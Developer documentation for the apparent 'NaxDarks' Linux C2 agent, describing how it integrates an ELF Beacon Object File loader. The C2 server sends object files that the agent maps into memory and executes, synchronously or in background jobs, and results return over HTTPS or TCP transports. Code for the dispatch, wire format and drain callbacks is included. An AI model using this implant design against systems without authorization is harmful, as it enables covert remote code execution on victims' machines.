# BOF SDK Integration

This document describes how the NaxDarks Linux agent integrates the [ELF BOF SDK](https://github.com/Loky-rt/elf-bof) to execute Beacon Object Files synchronously and asynchronously.

The SDK is an independent library. The agent consumes it as a pre-built static library (`libelf_bof_arm64.a/libelf_bof_x64.a`) with its headers. This document serves as a reference for how the integration works and as a guide for integrating the SDK into other agents.

---

## Overview

```
┌─────────────────────────────────────────────────────────────────────┐
│                         Agent (NaxDarks)                            │
│                                                                     │
│  ┌──────────────┐    ┌──────────────┐    ┌────────────────────┐    │
│  │  Transport    │    │  Commands    │    │  Heartbeat Loop    │    │
│  │              │    │              │    │                    │    │
│  │  tcp.c       │──▶│  commands.c  │    │  drain async       │    │
│  │  https.c     │    │              │    │  results every     │    │
│  │  tcp_bind.c  │    │  CMD_BOF ────│──┐ │  heartbeat cycle   │    │
│  │              │    │  CMD_ASYNC ──│─┐│ │                    │    │
│  │  init:       │    │  CMD_JOBS ──│─┤│ │  nax_async_drain() │    │
│  │  nax_bof_    │    │  CMD_KILL ──│─┤│ │        │           │    │
│  │  sdk_init()  │    │             │ │││ │        ▼           │    │
│  └──────────────┘    └─────────────┘ │││ │  callback sends    │    │
│                                      │││ │  RESULT frame      │    │
│  ┌───────────────────────────────────┼┼┤ │                    │    │
│  │           ELF BOF SDK             │││ └────────────────────┘    │
│  │                                   │││                           │
│  │  nax_bof_execute() ◀─────────────┘││                           │
│  │  nax_async_start()  ◀─────────────┘│                           │
│  │  nax_async_list()   ◀──────────────┘                           │
│  │  nax_async_kill()   ◀──────────────┘                           │
│  │  nax_async_drain()  ◀──── heartbeat loop                       │
│  │                                                                 │
│  └─────────────────────────────────────────────────────────────────┘
│                                                                     │
│  deps/elf-bof/                                                      │
│  ├── include/  (bof_api.h, elf_bof.h, bof_async.h, nax_bof_sdk.h) │
│  └── lib/      (libelf_bof_x64.a, libelf_bof_arm64.a)             │
└─────────────────────────────────────────────────────────────────────┘
```

---

## File Layout

```
nax_linux/
├── deps/elf-bof/
│   ├── include/
│   │   ├── nax_bof_sdk.h       ← SDK umbrella header
│   │   ├── elf_bof.h           ← nax_bof_execute()
│   │   ├── bof_async.h         ← nax_async_start/drain/kill/list
│   │   └── bof_api.h           ← Beacon*/Ax* API (used by BOFs, not the agent)
│   └── lib/
│       ├── libelf_bof_x64.a    ← Pre-built static library (x86_64)
│       └── libelf_bof_arm64.a  ← Pre-built static library (ARM64)
├── src/
│   ├── Transport/
│   │   ├── tcp.c               ← calls nax_bof_sdk_init() + nax_async_drain()
│   │   ├── https.c             ← calls nax_bof_sdk_init() + nax_async_drain()
│   │   └── tcp_bind.c          ← calls nax_bof_sdk_init() + nax_async_drain()
│   └── Commands/
│       └── commands.c          ← BOF dispatch: cmd_bof, cmd_bof_async, cmd_bof_jobs, cmd_bof_kill
└── Makefile                    ← -Ideps/elf-bof/include + links libelf_bof_arm64.a/libelf_bof_x64.a
```

---

## Build Integration

### Makefile

```makefile
# SDK paths
BOF_SDK_DIR := deps/elf-bof
BOF_SDK_INC := $(BOF_SDK_DIR)/include

# Select library per architecture
ifeq ($(CC),aarch64-linux-gnu-gcc)
  BOF_SDK_LIB := $(BOF_SDK_DIR)/lib/libelf_bof_arm64.a
else
  BOF_SDK_LIB := $(BOF_SDK_DIR)/lib/libelf_bof_x64.a
endif

# Compiler flags — include SDK headers
CFLAGS += -I$(BOF_SDK_INC)

# Link — SDK library + pthread (required by async system)
$(TARGET): $(SRCS)
	$(CC) $(CFLAGS) $(SRCS) -o $(TARGET) $(BOF_SDK_LIB) -lpthread
```

The agent does **not** compile any SDK source files. It only links the pre-built `.a` and includes the headers.

---

## Initialization

Each transport calls `nax_bof_sdk_init()` once at startup, before entering the heartbeat loop:

```c
// tcp.c / https.c / tcp_bind.c
#include "nax_bof_sdk.h"

extern void nax_bof_sdk_init(void);

void nax_https_main(NaxAgent *a) {
    nax_bof_sdk_init();   // Initialize SDK (async system + symbol table)
    // ... heartbeat loop ...
}
```

`nax_bof_sdk_init()` initializes the async job system (mutexes, thread slots) and the custom symbol resolution table. It must be called before any `nax_bof_execute()` or `nax_async_start()`.

---

## Synchronous Execution

### Flow

```
C2 Server                    Agent
    │                           │
    │── TASK: CMD_BOF (0x50) ──▶│
    │   [bof_size][bof][args]   │
    │                           │── cmd_bof()
    │                           │     parse bof_data + args
    │                           │     nax_bof_execute(bof, args, "go", &output, &len)
    │                           │       ├── mmap(RW)
    │                           │       ├── load ELF sections
    │                           │       ├── resolve Ax*/Beacon* symbols
    │                           │       ├── apply relocations
    │                           │       ├── mprotect(RX)
    │                           │       ├── go(args, args_len)
    │                           │       ├── collect BeaconPrintf output
    │                           │       └── zero + munmap
    │                           │
    │◀── RESULT: output ────────│
```

### Agent code

```c
#include "elf_bof.h"

static uint8_t cmd_bof(NaxAgent *a, NaxTask *t, uint8_t **out, uint32_t *out_len)
{
    // Parse wire format: [bof_size(4LE)][bof_bytes][args_size(4LE)][args_bytes]
    uint32_t bof_size = read_u32_le(t->args);
    const uint8_t *bof_data = t->args + 4;
    uint32_t args_len = read_u32_le(t->args + 4 + bof_size);
    const uint8_t *bof_args = t->args + 8 + bof_size;

    // Execute — blocks until go() returns
    char *output = NULL;
    uint32_t output_len = 0;
    int rc = nax_bof_execute(bof_data, bof_size,
                             bof_args, args_len,
                             "go",
                             &output, &output_len);

    *out = (uint8_t *)output;
    *out_len = output_len;
    return (rc == 0) ? NAX_STATUS_OK : NAX_STATUS_ERR;
}
```

The result is sent immediately via the transport's `send_result()`.

---

## Asynchronous Execution

### Flow

```
C2 Server                    Agent                           Worker Thread
    │                           │                                │
    │── TASK: CMD_ASYNC (0x51)─▶│                                │
    │                           │── cmd_bof_async()              │
    │                           │     nax_async_start(task_id,   │
    │                           │       bof, args)               │
    │                           │       ├── deep copy bof + args │
    │                           │       ├── create stop_pipe     │
    │                           │       └── pthread_create ─────▶│ nax_bof_execute()
    │                           │                                │   go(args, len)
    │                           │── return STATUS_ASYNC (0xFE)   │     BeaconPrintf(...)
    │                           │   (no result sent yet)         │     check should_stop()
    │                           │                                │   return
    │   ... next heartbeat ...  │                                │ job.completed = 1
    │                           │── nax_async_drain(callback) ───│
    │                           │     callback(task_id, output)  │
    │◀── RESULT: output ────────│                                │
```

### Agent code — dispatch

```c
#include "bof_async.h"

static uint8_t cmd_bof_async(NaxAgent *a, NaxTask *t, uint8_t **out, uint32_t *out_len)
{
    // Parse bof_data + args (same format as sync)
    // ...

    int idx = nax_async_start(t->task_id, bof_data, bof_size, bof_args, bof_args_len);
    if (idx < 0) {
        *out = strdup("all job slots busy (max 8)");
        return NAX_STATUS_ERR;
    }

    // Don't send result now — drain will deliver it later
    *out = NULL;
    *out_len = 0;
    return NAX_STATUS_ASYNC;  // 0xFE — transport suppresses immediate RESULT
}
```

`STATUS_ASYNC` (0xFE) tells the transport **not** to send a RESULT frame for this task. The task stays open until the drain callback delivers the output.

### Agent code — drain

Each transport drains completed async results on every heartbeat cycle:

```c
// HTTPS transport
static void https_async_cb(uint32_t task_id, uint8_t status,
                            const char *output, uint32_t output_len,
                            void *user_data) {
    NaxAgent *a = (NaxAgent *)user_data;
    https_send_result(a, task_id, status, (uint8_t *)output, output_len);
}

static void nax_https_drain_async(NaxAgent *a) {
    nax_async_drain(https_async_cb, a);
}

// In the heartbeat loop:
while (a->running) {
    // ... send heartbeat, process tasks ...

    nax_https_drain_async(a);  // deliver completed BOF results

    // ... sleep ...
}
```

The callback receives the BOF's output and sends it as a normal RESULT frame with the original `task_id`. The C2 matches it to the pending task.

---

## Job Management

### List jobs (CMD_BOF_JOBS — 0x52)

```c
static uint8_t cmd_bof_jobs(NaxAgent *a, NaxTask *t, uint8_t **out, uint32_t *out_len)
{
    char buf[1024];
    int n = nax_async_list(buf, sizeof(buf));
    *out = (uint8_t *)strdup(buf);
    *out_len = (uint32_t)n;
    return NAX_STATUS_OK;
}
```

Output example:

```
  Job #0  task=19  running
  Job #3  task=24  running
```

### Kill job (CMD_BOF_KILL — 0x53)

```c
static uint8_t cmd_bof_kill(NaxAgent *a, NaxTask *t, uint8_t **out, uint32_t *out_len)
{
    int idx = read_u32_le(t->args);
    if (nax_async_kill(idx) == 0) {
        *out = strdup("Job #N stop signal sent");
        return NAX_STATUS_OK;
    }
    *out = strdup("invalid job index or not running");
    return NAX_STATUS_ERR;
}
```

`nax_async_kill()` writes to the job's stop pipe. The BOF detects it via `BeaconGetStopJobEvent()` and exits cooperatively. Non-cooperative BOFs will run until completion regardless.

---

## SDK Functions Used

| Function | Header | Used in | Purpose |
|----------|--------|---------|---------|
| `nax_bof_sdk_init()` | `nax_bof_sdk.h` | Transport init | Initialize SDK once at startup |
| `nax_bof_execute()` | `elf_bof.h` | `cmd_bof` | Execute BOF synchronously |
| `nax_async_start()` | `bof_async.h` | `cmd_bof_async` | Start BOF in background thread |
| `nax_async_drain()` | `bof_async.h` | Heartbeat loop | Deliver completed async results |
| `nax_async_list()` | `bof_async.h` | `cmd_bof_jobs` | List active jobs |
| `nax_async_kill()` | `bof_async.h` | `cmd_bof_kill` | Signal job to stop |
| `nax_bof_register_symbol()` | `nax_bof_sdk.h` | _(not used yet)_ | Register custom symbols for BOFs |

---

## Wire Format

Both `CMD_BOF` (0x50) and `CMD_BOF_ASYNC` (0x51) use the same argument layout:

```
┌──────────────────┬───────────────────┬──────────────────┬───────────────────┐
│ bof_size: 4B LE  │ bof_data: N bytes │ args_size: 4B LE │ args_data: N bytes│
└──────────────────┴───────────────────┴──────────────────┴───────────────────┘
```

| Field | Description |
|-------|-------------|
| `bof_size` | Size of the compiled BOF `.o` file |
| `bof_data` | Raw ELF relocatable object bytes |
| `args_size` | Size of packed arguments (0 if no args) |
| `args_data` | Cobalt Strike `bof_pack` format (parsed with `BeaconDataExtract`) |

The Go agent plugin (`pl_commands.go`) builds this from the operator's command:

```go
case "bof":
    bofBytes := decode_file(args["file"])
    packedArgs := decode_base64(args["args"])
    // Wire: [CMD_BOF][len][bof_size(4)][bof][args_size(4)][args]
```

---

## Transport-Specific Drain Callbacks

Each transport has its own callback because the send mechanism differs:

| Transport | Callback | Sends via |
|-----------|----------|-----------|
| HTTPS | `https_async_cb` | `https_send_result()` → profile-encoded POST |
| TCP | `async_result_sender` | `send_encrypted()` → length-prefixed TCP |
| TCP Bind | `bind_async_cb` | `send_encrypted(sock)` → length-prefixed to parent |

The SDK doesn't know about transports — it just calls the callback with the output. The agent decides how to deliver it.

---

## Updating the SDK

When the SDK is updated:

```bash
# In the SDK repo
cd elf-bof-sdk
git pull
make

# Copy to agent
cp include/*.h  ../naxdarks/nax_linux/deps/elf-bof/include/
cp lib/*.a      ../naxdarks/nax_linux/deps/elf-bof/lib/
```

No agent code changes needed unless the SDK API changes.

---

## References

| File | Description |
|------|-------------|
| `src/Commands/commands.c` | `cmd_bof`, `cmd_bof_async`, `cmd_bof_jobs`, `cmd_bof_kill` |
| `src/Transport/tcp.c` | `nax_bof_sdk_init()` + `nax_drain_async_results()` |
| `src/Transport/https.c` | `nax_bof_sdk_init()` + `nax_https_drain_async()` |
| `src/Transport/tcp_bind.c` | `nax_bof_sdk_init()` + `nax_bind_drain_async()` |
| `deps/elf-bof/include/` | SDK headers |
| `deps/elf-bof/lib/` | Pre-built static libraries |
